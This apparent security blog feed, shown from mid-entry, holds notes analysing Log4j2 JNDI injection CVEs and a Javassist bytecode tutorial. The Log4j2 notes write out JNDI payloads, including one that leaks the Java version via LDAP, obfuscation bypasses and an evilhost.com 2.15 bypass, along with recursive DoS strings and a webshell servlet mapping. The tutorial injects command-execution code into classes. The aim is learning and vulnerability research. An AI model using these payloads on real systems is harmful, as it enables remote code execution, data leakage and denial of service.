href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483945&amp;idx=1&amp;sn=b15b68d95da83bb20f1b3496396f823a&amp;chksm=cff19125f88618338373a32f98be3d2a9497b464d6531658c2aa96f4872c23eed294441917b5&amp;mpshare=1&amp;scene=23&amp;srcid=1211aS0Tghr1agBnBRlwwGTw&amp;sharer_sharetime=1639232420884&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><p><a href="https://www.cnblogs.com/jona-test/p/11399218.html">https://www.cnblogs.com/jona-test/p/11399218.html</a></p><p>更新 2021/12/24</p><p>看了大哥4ra1n的文章 <a href="https://xz.aliyun.com/t/10659">https://xz.aliyun.com/t/10659</a></p><p>其中学习了dns（DNS协议是属于JNDI协议的） 可以带出数据 nc -lvup 通过udp接</p><p><img src="https://user-images.githubusercontent.com/63966847/147314294-222e4af5-98b3-4eac-863a-64316c775f91.png" alt="image"></p><p>然后就是回显的问题，通过报错来回显，其中port本该是int如果给它无法转int的字符串就会抛出这里的信息(触发RuntimeException)，并且ignoreExceptions配置为false。触发RuntimeException()</p><p>而NumberFormatException就是触发RuntimeException的子类。</p><p>${jndi:ldap://x.x.x.x:${java:version}/xxx}</p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>这个东西太多了，在tw一看就很多很多。一方面是因为一些协议可以返回输入的值比如：lower data</p><p>还有一个bypass思路是因为执行解析log4j2中的${}问题。简单的说也是将${::-x}解析成x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jn$&#123;::-d&#125;i:ldap://127.0.0.1:8880/&#125;</span><br></pre></td></tr></table></figure><h2 id="cve-dos"><a href="#cve-dos" class="headerlink" title="cve-dos"></a>cve-dos</h2><p>大哥成功获得apache的cve。<a href="https://xz.aliyun.com/t/10670">https://xz.aliyun.com/t/10670</a></p><p>简单的看了一下发现里面的思路和我不一样，大哥是想到了网络连接，也就可以存在一个网络超时的问题，而且log4j2支持递归解析。。所以就让他一直解析网络超时的ip…造成dos.</p><p>在这个cve通报中发现存在rce?简单的看了一下，我的理解是因为配置文件配置的这一次解析问题,如下配置中就有$${}这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Appenders&gt;</span><br><span class="line">    &lt;Console name=&quot;STDOUT&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">        &lt;PatternLayout&gt;</span><br><span class="line">            &lt;pattern&gt;%d %p %c&#123;1.&#125; [%t] $$&#123;ctx:loginId&#125; %m%n&lt;/pattern&gt;</span><br><span class="line">        &lt;/PatternLayout&gt;</span><br><span class="line">    &lt;/Console&gt;</span><br><span class="line">&lt;/Appenders&gt;</span><br></pre></td></tr></table></figure><p>而其中里面了ctx协议ContextMapLookup类，简单的说大概就是将我们解析的东西放到map里面然后在取出来。取出来之后在解析${xxxx}就造成了rce问题/dos问题。</p><h2 id="bypass-2-15"><a href="#bypass-2-15" class="headerlink" title="bypass 2.15"></a>bypass 2.15</h2><p>昨天在tw上看到了bypass 2.15版本,这个东西还没有具体去复现。不过看了一下exp大致懂了。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>不过环境要求比较严格而且真实环境的rce可能比较可能。。。</p><p>2021/12/20更新</p><p>今天看到了大哥写的bypass 2.15 rce分析简单的记录一下 <a href="https://xz.aliyun.com/t/10689">https://xz.aliyun.com/t/10689</a></p><p>利用条件</p><p>1.开启lookup功能</p><p>2.macos系统</p><p>3.泛域名解析</p><p>4.本地存在gadget</p><p>该exp通过去绕过了ip限制并且可以解析远程恶意ip(macos系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1#evilhost.com:1389/exp&#125;</span><br></pre></td></tr></table></figure><p>然后去绕过ldap服务的限制。</p><p><img src="https://user-images.githubusercontent.com/63966847/146754506-bccfb16a-57e0-40d6-be17-36cbe67705a7.png" alt="image-20211220183446609"></p><p>正常情况是直接通过Reference去利用，不过这里不能使用Reference，所以就利用deserializeObject，其实就是bypass jdk8u191。满足本地存在gadget。只是需要把classname换成基本数据类型。去绕过<strong>if (!allowedClasses.contains(className))</strong></p><p>也其实就是我们在了ldap的时候的思路 <strong>LDAP服务攻击一般是先测Reference再测deserializeObject</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/146754481-8d5aff45-fa12-4593-9165-ace4aa0257bd.png" alt="image-20211220183705875"></p><h2 id="CVE-2021-45105"><a href="#CVE-2021-45105" class="headerlink" title="CVE-2021-45105"></a>CVE-2021-45105</h2><p>这个漏洞我看了下没有看太懂，也就不这么介绍了反正大概介绍递归解析的问题。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#123;::-$$&#123;::-$&#125;&#125;&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-::-$$&#123;::-$&#125;</span><br><span class="line">然后在 <span class="built_in">this</span>.substitute(event, bufName, <span class="number">0</span>, bufName.length());</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">$&#123;::-$&#125;</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">::-$ 会进入一个异常</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146945232-9157632d-2463-4d2c-976d-544e49ff249c.png" alt="image"></p><p><del>说不定其他解析表达式也存在。。。。</del></p><p><a href="https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor">https://www.zerodayinitiative.com/blog/2021/12/17/cve-2021-45105-denial-of-service-via-uncontrolled-recursion-in-log4j-strsubstitutor</a></p><p><a href="https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc">https://github.com/apache/logging-log4j2/commit/806023265f8c905b2dd1d81fd2458f64b2ea0b5e#diff-3f056c67add25837df0d7d8b8ab22df492dc14e3c5bae5f2914e69ac8af8d5cc</a></p><p>更新 2021/12/22</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&amp;mid=2247490570&amp;idx=1&amp;sn=279f4c19c266dd2f443088e33786f867&amp;chksm=fe25190bc952901d1a754f78802b3dd1fd1d3107cd0d92f54b62c64797e966962427ca989126&amp;mpshare=1&amp;scene=23&amp;srcid=1222cs3lrxzG5cIJHSfdgcOe&amp;sharer_sharetime=1640169352847&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在配置文件中配置：$$&#123;ctx:apiVersion&#125;   则输入 $&#123;$&#123;ctx:apiVersion&#125;&#125;或$&#123;$&#123;::-$&#123;::-$$&#123;::-aaa&#125;&#125;&#125;&#125;则可以造成递归dos</span><br><span class="line">在配置文件中配置：$&#123;ctx:apiVersion&#125;   则输入$&#123;$&#123;::-$&#123;::-$$&#123;::-dos&#125;&#125;&#125;&#125;则可以造成递归dos</span><br></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>cve:<a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzYxODA4Mw==&amp;mid=2247484028&amp;idx=1&amp;sn=5748c6b75530a786f1bf0622616413c6&amp;chksm=cf45fa30f83273269da4884f82c5d4ce43089d6ba8a7b6470e35f963d690ec781faa85ab48e1&amp;mpshare=1&amp;scene=23&amp;srcid=12298p7j6KLY39FVuwNzmFRD&amp;sharer_sharetime=1640749370687&amp;sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd">聊聊配置文件 RCE 这件事</a></p><p>不愧是师傅总结的不错，简单的说就是通过配置文件去rce.<br>突然又想到了一个：web.xml里面添加servlet去实现解析一句话。<br>访问/exp路由就会解析</p><p><img src="https://user-images.githubusercontent.com/63966847/147626724-576ba23e-7fdf-4b73-b591-095af4578f8a.png" alt="image"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jsp-file</span>&gt;</span>/WEB-INF/1.jsp<span class="tag">&lt;/<span class="name">jsp-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/exp<span class="tag">&lt;/<span class="name">url-patten</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><p>主要是自己的问题，</p><p>第一点是读文档的习惯少导致不理解其中的意思失去第一时间拥有exp</p><p>第二点是自己没有考虑到dos中的网络连接超时问题。</p><p>第三点是自己发现了ResourceBundleLookup类却不知道其意思导致失去新思路的发现。</p><p>（如果官方在删除lookup功能我相信还会有更多的漏洞。。。。。。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> test image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>啥也没有</title>
      <link href="/2022/01/01/yso%E6%90%AD%E5%BB%BA/"/>
      <url>/2022/01/01/yso%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>参考：</p><p><a href="https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Javassist</title>
      <link href="/2021/12/10/Javassist/"/>
      <url>/2021/12/10/Javassist/</url>
      
        <content type="html"><![CDATA[<h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Javassist</code>是一个开源的分析、编辑和创建 Java 字节码的类库；相对于<code>ASM</code>，<code>Javassist</code>提供了更加简单便捷的<code>API</code>。通过<code>Javassist</code>，我们可以像写<code>Java</code>代码一样直接插入<code>Java</code>代码片段，不用关注<code>Java</code>底层的字节码和栈操作，仅仅需要学会使用<code>Javassist</code>的<code>API</code>即可实现字节码编辑。</p><h2 id="API和标识符"><a href="#API和标识符" class="headerlink" title="API和标识符"></a>API和标识符</h2><p><code>Javassist</code>提供了类似于 Java 反射机制的 API，如 <a href="http://www.javassist.org/html/javassist/CtClass.html">CtClass</a>，<a href="http://www.javassist.org/html/javassist/CtConstructor.html">CtConstructor</a>、<a href="http://www.javassist.org/html/javassist/CtMethod.html">CtMethod</a>、<a href="http://www.javassist.org/html/javassist/CtField.html">CtField</a> 与 Java 反射的<code>class</code>、<code>Constructor</code>、<code>Method</code>、<code>Field</code>非常的相似。</p><div class="table-container"><table><thead><tr><th>类</th><th>描述</th></tr></thead><tbody><tr><td>ClassPool</td><td>ClassPool是一个存储CtClass的容器，如果调用<code>get</code>方法会搜索并创建一个表示该类的CtClass对象</td></tr><tr><td>CtClass</td><td>CtClass表示的是从ClassPool获取的类对象，可对该类就行读写编辑等操作</td></tr><tr><td>CtMethod</td><td>可读写的类方法对象</td></tr><tr><td>CtConstructor</td><td>可读写的类构造方法对象</td></tr><tr><td>CtField</td><td>可读写的类成员变量对象</td></tr></tbody></table></div><p><code>Javassist</code>使用了内置的标识符来表示一些特定的含义，如：<code>$_</code>表示返回值。我们可以在动态插入类代码的时候使用这些特殊的标识符来表示对应的对象。</p><div class="table-container"><table><thead><tr><th>表达式</th><th>描述</th></tr></thead><tbody><tr><td><code>$0, $1, $2, ...</code></td><td><code>this</code>和方法参数</td></tr><tr><td><code>$args</code></td><td><code>Object[]</code>类型的参数数组</td></tr><tr><td>$$$$</td><td>所有的参数，如<code>m($$)</code>等价于<code>m($1,$2,...)</code></td></tr><tr><td><code>$cflow(...)</code></td><td>cflow变量</td></tr><tr><td><code>$r</code></td><td>返回类型，用于类型转换</td></tr><tr><td><code>$w</code></td><td>包装类型，用于类型转换</td></tr><tr><td><code>$_</code></td><td>方法返回值</td></tr><tr><td><code>$sig</code></td><td>方法签名，返回<code>java.lang.Class[]</code>数组类型</td></tr><tr><td><code>$type</code></td><td>返回值类型，<code>java.lang.Class</code>类型</td></tr><tr><td><code>$class</code></td><td>当前类，<code>java.lang.Class</code>类型</td></tr></tbody></table></div><h2 id="读取类-成员变量-方法信息"><a href="#读取类-成员变量-方法信息" class="headerlink" title="读取类/成员变量/方法信息"></a>读取类/成员变量/方法信息</h2><p><code>Javassist</code>通过<code>ClassPool</code>对象获取到<code>CtClass</code>对象后就可以像使用 Java 反射 API 一样去读取类信息</p><p><code>Javassist</code>读取类信息示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 获取类对象</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;解析类名：&quot;</span>+ ctClass.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;父类：&quot;</span>+ ctClass.getSuperclass());</span><br><span class="line">        System.out.println(<span class="string">&quot;实现接口：&quot;</span>+ Arrays.toString(ctClass.getInterfaces()));</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取所有构造方法</span></span><br><span class="line">        CtConstructor[] constructors = ctClass.getDeclaredConstructors();</span><br><span class="line">        <span class="comment">// 获取所有成员变量</span></span><br><span class="line">        CtField[] ctFields = ctClass.getDeclaredFields();</span><br><span class="line">        <span class="comment">// 获取所有成员方法</span></span><br><span class="line">        CtMethod[] ctMethods = ctClass.getDeclaredMethods();</span><br><span class="line">        <span class="comment">// 输出所有的构造方法</span></span><br><span class="line">        <span class="keyword">for</span>(CtConstructor constructor:constructors)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;构造方法：&quot;</span>+ constructor);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 输出所有的成员变量</span></span><br><span class="line">        <span class="keyword">for</span>(CtField ctField:ctFields)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成员变量：&quot;</span>+ctField);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 输出所有的成员方法</span></span><br><span class="line">        <span class="keyword">for</span>(CtMethod ctMethod: ctMethods)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;成员方法：&quot;</span>+ctMethod);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="images/image-20221001170103439.png" alt="image-20221001170103439"></p><h2 id="修改类方法"><a href="#修改类方法" class="headerlink" title="修改类方法"></a>修改类方法</h2><p><code>CtMethod</code>提供了类方法修改的<code>API</code>：</p><ul><li><code>setModifies()</code>：修改类的访问修饰符</li><li><code>insertBefore()</code>：在类方法执行前插入任意 Java 代码片段</li><li><code>insertAfter()</code>：在类方法执行后插入任意 Java 代码片段</li><li><code>setBody()</code>：修改整个方法的代码</li><li><code>removeField()</code>：删除类的成员变量</li><li><code>removeMethod()</code>：删除类的方法</li></ul><p>修改前：<br><img src="images/image-20221001175527019.png" alt="image-20221001175527019"></p><p>修改类方法代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 获取类对象</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取hello方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;);</span><br><span class="line">        <span class="comment">// 修改hello方法访问权限为private</span></span><br><span class="line">        ctMethod.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">// 修改整个hello方法</span></span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span> +</span><br><span class="line">                         <span class="string">&quot;return \&quot;ok!\&quot;;&#125;&quot;</span>);</span><br><span class="line">        <span class="comment">// 替换原有的文件，绝对路径</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;target/classes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后类文件被修改如下<br><img src="images/image-20221001232420549.png" alt="image-20221001232420549"></p><p>再次运行时执行我们插入的命令执行代码片段<br><img src="images/image-20221001232449700.png" alt="image-20221001232449700"></p><h2 id="动态创建Java类二进制"><a href="#动态创建Java类二进制" class="headerlink" title="动态创建Java类二进制"></a>动态创建Java类二进制</h2><p><code>Javassist</code>可以动态的创建一个类的二进制，例如需要生成一个<code>HelloWorld</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello&quot;</span> + name);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>Javassist</code>生成类字节码示例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytecode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/28 17:32</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建ClassPool对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 创建HelloWorld类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">helloWorldClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;com.bytecode.HelloWorld&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建类成员</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;private static String name = \&quot;dotast\&quot;;&quot;</span>,helloWorldClass);</span><br><span class="line">        <span class="comment">// 添加类成员到类中</span></span><br><span class="line">        helloWorldClass.addField(ctField);</span><br><span class="line">        <span class="comment">// 创建 main 主方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">mainMethod</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;public static void main(String[] args)&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        System.out.println(\&quot;Hello\&quot; + name);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;&quot;</span>, helloWorldClass);</span><br><span class="line">        helloWorldClass.addMethod(mainMethod);</span><br><span class="line">        <span class="comment">// 替换原有的文件，绝对路径</span></span><br><span class="line">        helloWorldClass.writeFile(<span class="string">&quot;target/classes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>生成后如下<br><img src="images/image-20221002000336101.png" alt="image-20221002000336101"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python基础</title>
      <link href="/2021/11/24/python%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/11/24/python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cc574b191e7d18374aa2bf2c03505e73a6a32cf6caa8ece274fa931a44233ef7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">我爱你一生一世</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python基础 </tag>
            
        </tags>
      
